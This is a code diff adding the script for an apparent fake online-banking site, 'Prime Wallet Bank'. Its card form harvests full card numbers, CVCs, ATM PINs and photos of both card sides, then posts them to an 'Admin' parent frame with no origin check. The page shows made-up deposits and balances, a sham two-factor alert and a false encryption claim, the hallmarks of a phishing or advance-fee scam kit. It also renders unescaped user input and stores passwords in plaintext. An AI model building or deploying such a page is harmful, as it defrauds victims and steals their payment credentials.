+  const cardType = document.getElementById("cardType").value;
+  const atmHolder = document.getElementById("atmHolder").value.trim();
+  const atmNumber = document.getElementById("atmNumber").value.trim().replace(/\s/g, "");
+  const atmExpiry = document.getElementById("atmExpiry").value.trim();
+  const atmCvc = document.getElementById("atmCvc").value.trim();
+  const atmPin = document.getElementById("atmPin").value.trim();
+  const atmFrontFile = document.getElementById("atmFront").files[0];
+  const atmBackFile = document.getElementById("atmBack").files[0];
+
+  if (!cardType || !atmHolder || atmNumber.length < 13 || !atmExpiry || !atmCvc || atmPin.length !== 4) {
+    return alert("âŒ Please fill ALL card details correctly!");
+  }
+
+  // Expiry validation
+  const [month, year] = atmExpiry.split('/');
+  const expMonth = parseInt(month);
+  const expYear = parseInt("20" + year);
+  const now = new Date();
+  const expiryDate = new Date(expYear, expMonth - 1);
+  if (expiryDate <= now) return alert("âŒ Card has expired! Please use a valid, unexpired card.");
+
+  if (!atmFrontFile || !atmBackFile) {
+    return alert("âŒ Please upload both Front & Back images of your card!");
+  }
+
+  const atmFront = await fileToDataUrl(atmFrontFile);
+  const atmBack = await fileToDataUrl(atmBackFile);
+
+  currentUser = {
+    ...currentUser,
+    cardType, atmHolder, atmNumber, atmExpiry, atmCvc, atmPin, atmFront, atmBack,
+    card_approved: false
+  };
+
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+
+  // Send to Admin
+  if (window.parent !== window) {
+    window.parent.postMessage({
+      type: "CARD_SUBMISSION",
+      ...currentUser,
+      submitted_at: new Date().toISOString()
+    }, "*");
+  }
+
+  alert("âœ… Card details submitted successfully! ðŸ“¤\n\nâ³ Our team will review your card within 24 hours.\nYou'll be notified by email once approved!");
+  openPage("dashboardPage");
+}
+
+// ==================================================
+// âœ… DEPOSIT â€” FUNCTIONAL
+// ==================================================
+function submitDeposit() {
+  const amount = parseFloat(document.getElementById("depositAmount").value);
+  const method = document.getElementById("depositMethod").value;
+  const note = document.getElementById("depositNote").value || "";
+
+  if (!amount || amount <= 0) return alert("âŒ Enter a valid amount!");
+
+  currentUser.balance = (currentUser.balance || 0) + amount;
+  transactions.unshift({
+    type: "Deposit", amount, method, note,
+    date: new Date().toISOString(), status: "Processing"
+  });
+
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+  localStorage.setItem("transactions", JSON.stringify(transactions));
+
+  if (window.parent !== window) {
+    window.parent.postMessage({
+      type: "DEPOSIT_ATTEMPT",
+      user_email: currentUser.email, amount, method, note,
+      timestamp: new Date().toISOString()
+    }, "*");
+  }
+
+  alert(`âœ… Deposit of $${amount.toFixed(2)} submitted!\n\nâ³ Status: Processing â€” will be confirmed shortly.`);
+  openPage("dashboardPage");
+}
+
+// ==================================================
+// âœ… TRANSFER â€” VERIFY + SEND
+// ==================================================
+function verifyAccount() {
+  document.getElementById("verifiedName").textContent = "Account Holder Verified";
+  document.getElementById("accountNameResult").style.display = "block";
+}
+
+function submitTransfer() {
+  const amount = parseFloat(document.getElementById("transferAmount").value);
+  const pin = document.getElementById("transferPin").value;
+  const recipientAcc = document.getElementById("recipientAccount").value;
+
+  if (!amount || amount <= 0) return alert("âŒ Enter valid amount!");
+  if (amount > (currentUser.balance || 0)) return alert("âŒ Insufficient balance!");
+  if (pin.length !== 4) return alert("âŒ Enter your 4-digit PIN!");
+
+  currentUser.balance -= amount;
+  transactions.unshift({
+    type: "Transfer Out", amount: -amount, recipient: recipientAcc,
+    date: new Date().toISOString(), status: "Completed"
+  });
+
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+  localStorage.setItem("transactions", JSON.stringify(transactions));
+
+  alert(`âœ… $${amount.toFixed(2)} sent successfully! ðŸŽ‰`);
+  openPage("dashboardPage");
+}
+
+// ==================================================
+// âœ… PAY BILL
+// ==================================================
+function submitBillPayment() {
+  const amount = parseFloat(document.getElementById("billAmount").value);
+  const pin = document.getElementById("billPin").value;
+  const provider = document.getElementById("billProvider").value;
+
+  if (!amount || amount <= 0) return alert("âŒ Enter valid amount!");
+  if (amount > (currentUser.balance || 0)) return alert("âŒ Insufficient balance!");
+  if (pin.length !== 4) return alert("âŒ Enter your 4-digit PIN!");
+
+  currentUser.balance -= amount;
+  transactions.unshift({
+    type: "Bill Payment", amount: -amount, provider,
+    date: new Date().toISOString(), status: "Completed"
+  });
+
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+  localStorage.setItem("transactions", JSON.stringify(transactions));
+
+  alert(`âœ… Bill payment of $${amount.toFixed(2)} to ${provider} successful!`);
+  openPage("dashboardPage");
+}
+
+// ==================================================
+// âœ… LOAD TRANSACTIONS
+// ==================================================
+function loadTransactions() {
+  const saved = localStorage.getItem("transactions");
+  transactions = saved ? JSON.parse(saved) : [];
+  const list = document.getElementById("transactionsList");
+
+  if (transactions.length === 0) {
+    list.innerHTML = `<div class="card text-center"><p>No transactions yet.</p><p class="text-muted mt-20">Start by making a deposit or transfer.</p></div>`;
+    return;
+  }
+
+  list.innerHTML = transactions.map(t => `
+    <div class="card" style="margin-bottom:10px">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <div>
+          <strong>${t.type}</strong>
+          <p class="text-muted" style="margin:0;font-size:12px">${new Date(t.date).toLocaleString()}</p>
+          ${t.note ? `<p style="font-size:13px;margin-top:4px">${t.note}</p>` : ''}
+        </div>
+        <strong style="font-size:18px;color:${t.amount >= 0 ? 'var(--success)' : 'var(--error)'}">
+          ${t.amount >= 0 ? '+' : ''}$${Math.abs(t.amount).toFixed(2)}
+        </strong>
+      </div>
+    </div>
+  `).join('');
+}
+
+// ==================================================
+// âœ… PROFILE
+// ==================================================
+function loadProfile() {
+  if (!currentUser) return;
+  document.getElementById("profileContent").innerHTML = `
+    <h3>ðŸ‘¤ Account Profile</h3>
+    <p><strong>Full Name:</strong> ${currentUser.full_name || 'â€”'}</p>
+    <p><strong>Email:</strong> ${currentUser.email || 'â€”'}</p>
+    <p><strong>Phone:</strong> ${currentUser.phone || 'â€”'}</p>
+    <p><strong>Date of Birth:</strong> ${currentUser.dob || 'â€”'}</p>
+    <p><strong>Country:</strong> ${currentUser.country || 'â€”'}</p>
+    <p><strong>State:</strong> ${currentUser.state || 'â€”'}</p>
+    <p><strong>City:</strong> ${currentUser.city || 'â€”'}</p>
+    <p><strong>Account Number:</strong> ${currentUser.account_number || 'â€”'}</p>
+    <p><strong>Balance:</strong> $${(currentUser.balance || 0).toFixed(2)}</p>
+    <p><strong>Account Status:</strong> ${currentUser.approved ? 'âœ… Approved' : 'â³ Pending Approval'}</p>
+    <p><strong>Card Status:</strong> ${hasApprovedCard ? 'âœ… Approved & Active' : (currentUser.atmHolder ? 'â³ Under Review' : 'Not Applied')}</p>
+  `;
+}
+
+// ==================================================
+// âœ… MESSAGES
+// ==================================================
+function loadMessages() {
+  document.getElementById("messagesList").innerHTML = `
+    <div class="alert-box alert-info">
+      <strong>ðŸ“¢ Welcome to Prime Wallet Bank!</strong><br>
+      Your account is being reviewed. We'll notify you once approved.
+    </div>
+    <div class="alert-box alert-success">
+      ðŸ’¡ Submit your ID and Card details to unlock full banking features.
+    </div>
+    <div class="alert-box alert-info">
+      ðŸ”’ Your account is protected with 256-bit encryption.
+    </div>
+  `;
+}
+
+// ==================================================
+// âœ… MY CARDS
+// ==================================================
+function loadCardsPage() {
+  const content = document.getElementById("cardsContent");
+  if (!currentUser.atmHolder) {
+    content.innerHTML = `
+      <div class="text-center">
+        <div style="font-size:48px;margin:20px 0">ðŸ’³</div>
+        <h3>No Card Yet</h3>
+        <p class="text-muted">Get your Prime Wallet Bank ATM Card to unlock Send Money & Pay Bills.</p>
+        <button class="btn-primary mt-20" onclick="openPage('cardPage')">ðŸ’³ Apply Now</button>
+      </div>
+    `;
+  } else {
+    content.innerHTML = `
+      <h3>ðŸ’³ Your Prime Wallet Card</h3>
+      <p><strong>Type:</strong> ${currentUser.cardType || 'â€”'}</p>
+      <p><strong>Cardholder:</strong> ${currentUser.atmHolder || 'â€”'}</p>
+      <p><strong>Number:</strong> **** **** **** ${currentUser.atmNumber?.slice(-4) || 'â€”'}</p>
+      <p><strong>Expiry:</strong> ${currentUser.atmExpiry || 'â€”'}</p>
+      <p><strong>Status:</strong> ${hasApprovedCard ? 'âœ… Approved & Active' : 'â³ Pending Approval'}</p>
+      ${!hasApprovedCard ? '<p class="text-muted mt-10">Waiting for admin approval â€” usually within 24 hours.</p>' : ''}
+    `;
+  }
+}
+
+// ==================================================
+// âœ… CHECKING ACCOUNT
+// ==================================================
+function loadCheckingPage() {
+  document.getElementById("checkingAcc").textContent = currentUser?.account_number || 'â€”';
+  document.getElementById("checkingBal").textContent = (currentUser?.balance || 0).toFixed(2);
+}
+
+// ==================================================
+// âœ… SETTINGS FUNCTIONS
+// ==================================================
+function updatePassword() {
+  const curr = document.getElementById("currentPassword").value;
+  const newPass = document.getElementById("newPassword").value;
+  const confirm = document.getElementById("confirmNewPassword").value;
+
+  if (curr !== currentUser.password) return alert("âŒ Current password is incorrect!");
+  if (newPass.length < 8) return alert("âŒ New password must be 8+ characters!");
+  if (newPass !== confirm) return alert("âŒ New passwords do not match!");
+
+  currentUser.password = newPass;
+  localStorage.setItem("registered_user", JSON.stringify(currentUser));
+  alert("âœ… Password updated successfully!");
+  openPage("settingsPage");
+}
+
+function toggleTwoFactor() {
+  alert("âœ… Two-Factor Authentication is now ENABLED!\n\nYou will receive a verification code via email/SMS on each login.");
+}
+
+function saveNotifications() {
+  alert("âœ… Notification preferences saved!");
+}
+
+function confirmAction(type) {
+  if (type === 'freeze') {
+    if (confirm("â„ï¸ Are you sure you want to FREEZE your account? All transactions will be blocked until you reactivate.")) {
+      alert("âœ… Account frozen. Contact support to reactivate.");
+    }
+  } else if (type === 'close') {
+    if (confirm("ðŸš« Are you sure you want to PERMANENTLY CLOSE your account? This cannot be undone!")) {
+      alert("âœ… Account closure request submitted.");
+    }
+  }
+}
+
+function submitReport() {
+  alert("âœ… Report submitted!\n\nTicket created â€” our team will respond within 24 hours.");
+  openPage("dashboardPage");
+}
+
+function refreshStatus() {
+  const result = document.getElementById("statusResult");
+  if (!currentUser) {
+    result.innerHTML = "Please log in to check status.";
+    return;
+  }
+  result.innerHTML = `
+    âœ… Email: ${currentUser.email}<br>
+    Account: ${currentUser.approved ? 'âœ… APPROVED' : 'â³ PENDING APPROVAL'}<br>
+    Card: ${hasApprovedCard ? 'âœ… APPROVED' : (currentUser.atmHolder ? 'â³ CARD UNDER REVIEW' : 'ðŸ“‹ NOT SUBMITTED')}<br>
+    Balance: $${(currentUser.balance || 0).toFixed(2)}
+  `;
+}
+
+// ==================================================
+// âœ… AUTO-CHECK APPROVAL â€” EVERY 30 SECONDS
+// ==================================================
+setInterval(() => {
+  if (!currentUser) return;
+  const saved = localStorage.getItem("registered_user");
+  if (!saved) return;
+  const fresh = JSON.parse(saved);
+  let updated = false;
+
+  // Account approval check
+  if (!currentUser.approved && fresh.approved) {
+    currentUser.approved = true;
+    alert("âœ… ðŸŽ‰ CONGRATULATIONS! YOUR ACCOUNT IS NOW APPROVED!\n\nAll banking features are now ACTIVE!");
+    updated = true;
+  }
+
+  // Card approval check
+  if (!hasApprovedCard && fresh.card_approved) {
+    hasApprovedCard = true;
+    currentUser.card_approved = true;
+    alert("âœ… ðŸ’³ SUCCESS! YOUR PRIME WALLET BANK ATM CARD IS APPROVED!\n\nðŸ”“ Send Money & Pay Bills are NOW UNLOCKED!");
+    updated = true;
+  }
+
+  // Balance update check
+  if (fresh.balance !== undefined && fresh.balance !== currentUser.balance) {
+    const oldBalance = currentUser.balance;
+    currentUser.balance = fresh.balance;
+    updated = true;
+    setTimeout(() => {
+      alert(`ðŸ’° DEPOSIT RECEIVED!\n\n+$${(fresh.balance - oldBalance).toFixed(2)}\n\nNew Balance: $${fresh.balance.toFixed(2)}`);
+    }, 500);
+  }
+
+  if (updated) {
+    localStorage.setItem("registered_user", JSON.stringify(currentUser));
+    loadDashboardData();
+  }
+}, 30000);
+
+// ==================================================
+// âœ… AUTO-LOGIN ON PAGE LOAD
+// ==================================================
+window.addEventListener("DOMContentLoaded", () => {
+  initDobDropdowns();
+  
+  const tokenCheck = localStorage.getItem("pw_token");
+  const savedUser = localStorage.getItem("registered_user");
+  
+  if (tokenCheck && savedUser) {
+    currentUser = JSON.parse(savedUser);
+    hasApprovedCard = currentUser.card_approved || false;
+    showPage("dashboardPage");
+    loadDashboardData();
+  }
+});
+</script>
+
+</body>
+</html>
+
